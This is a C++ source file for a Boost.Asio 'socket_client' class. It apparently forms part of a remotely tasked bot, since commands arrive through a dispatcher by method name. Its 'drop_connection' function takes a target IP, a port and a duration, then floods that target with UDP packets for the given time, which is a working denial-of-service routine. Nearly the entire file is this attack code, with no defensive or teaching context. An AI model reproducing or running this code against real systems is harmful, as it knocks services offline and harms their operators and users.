#include "socket_client.h"


void socket_client::set_config(uint16_t _port, std::string _ip)
{
	port = _port;
	ip = _ip;
}

bool socket_client::drop_connection(std::string _port, std::string _ip, std::string seconds)
{
	set_config(
		std::stoi(_port),
		_ip
	);

	if (!open_socket_udp())
		return false;
	
	send_packets(
		std::stoi(seconds)
	);

	return true;
}

bool socket_client::open_socket_udp()
{
	socket_udp.open(
		boost::asio::ip::udp::v4(),
		error
	);

	if (error) {
		std::cout << "error " << error.message() << '\n';
		return false;
	}

	return true;
}

void socket_client::send_packets(uint32_t seconds)
{
	boost::asio::ip::udp::endpoint remote_endpoint;
	remote_endpoint = boost::asio::ip::udp::endpoint(
		boost::asio::ip::address::from_string(ip),
		port
	);


	auto start_time = std::chrono::system_clock::now();
	long long time_elapsed = 0;
	do {
		socket_udp.send_to(
			boost::asio::buffer(buffer),
			remote_endpoint
		);
		auto end_time = std::chrono::system_clock::now();
		time_elapsed = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
		
	} while (seconds > time_elapsed);


}

void socket_client::execute()
{
	auto funct = fetch_function(results["method"]);
	results["completed"] = funct();
}

void socket_client::on_execute()
{

}

void socket_client::run(
	std::string id,
	bool response,
	std::string method,
	std::vector<std::string> args
) {
	base_task::run(id, response, method, args);
}

_function socket_client::fetch_function(std::string _function_name)
{
	if (_function_name == "drop_connection")
		return std::bind(
			&socket_client::drop_connection,
			this,
			_args[0],
			_args[1],
			_args[2]
		);


	return _function();
}